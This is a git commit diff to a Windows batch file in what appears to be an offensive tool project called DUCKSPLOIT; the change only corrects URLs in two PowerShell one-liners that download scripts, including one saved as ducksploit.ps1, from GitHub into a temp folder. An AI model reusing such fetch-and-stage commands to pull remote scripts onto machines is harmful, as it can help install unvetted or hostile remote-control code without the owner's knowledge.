d7bdc189803e5f7ac7fe6b2cd5781192e5684977
canarddu38 <71982379+canarddu38@users.noreply.github.com>
2022-06-09 17:41:52 +0200

    Update ds.bat

--- hacker/windows/ds.bat
+++ hacker/windows/ds.bat
@@ -5,8 +5,8 @@ mkdir %temp%\DuckSploit
 
 cls
 
-powershell "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/hacker/anim.ps1', '%temp%/DuckSploit/anim.ps1')"
-powershell "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/hacker/server.ps1', '%temp%/DuckSploit/ducksploit.ps1')"
+powershell "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/hacker/windows/anim.ps1', '%temp%/DuckSploit/anim.ps1')"
+powershell "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/hacker/windows/server.ps1', '%temp%/DuckSploit/ducksploit.ps1')"
 
 cls
 
